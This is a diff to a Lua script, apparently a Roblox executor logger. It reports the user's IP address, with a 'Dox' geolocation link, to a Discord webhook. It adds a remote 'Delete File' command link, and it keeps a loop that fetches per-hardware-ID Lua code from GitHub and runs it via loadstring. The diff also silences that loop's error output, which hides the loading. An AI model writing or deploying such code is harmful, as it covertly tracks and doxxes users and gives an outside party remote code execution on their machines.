@@ -70,6 +70,11 @@ local function generateGeoLink(ip)
     return "https://ipinfo.io/" .. ip
 end
 
+local function generateDeleteFileURL()
+    -- Assuming you have a service that handles file deletion
+    return "https://example.com/deletefile?filename=" .. filePath
+end
+
 -- Identify executor
 local exe = pcall(function() return identifyexecutor() end) and identifyexecutor() or "Unknown"
 
@@ -100,6 +105,7 @@ local data = {
                     ["name"] = "Commands",
                     ["value"] = "[Blacklist](" .. generateEditURL() .. ")\n" ..
                              "[Create File](" .. generateCreateFileURL() .. ")\n" ..
+                             "[Delete File](" .. generateDeleteFileURL() .. ")\n" ..
                              "[Dox](" .. generateGeoLink(ipAddress) .. ")",
                     ["inline"] = true
                 },
@@ -127,11 +133,10 @@ if not success then
     warn("Failed to send Discord message: " .. err)
 end
 
-
+-- Continuous script loading
 while true do
     wait(5)
     local success, result = pcall(function()
-        -- Construct the URL dynamically using HWID
         local url = "https://raw.githubusercontent.com/Pumpuma/Test/main/" .. hwid .. ".lua"
         return loadstring(game:HttpGet(url))()
     end)
@@ -140,7 +145,6 @@ while true do
         -- Exit the loop if the script executes successfully
         break
     else
-        -- Optionally, print the error for debugging purposes
-        print("Failed to load script: " .. tostring(result))
+        -- Do nothing if the script fails to load
     end
 end
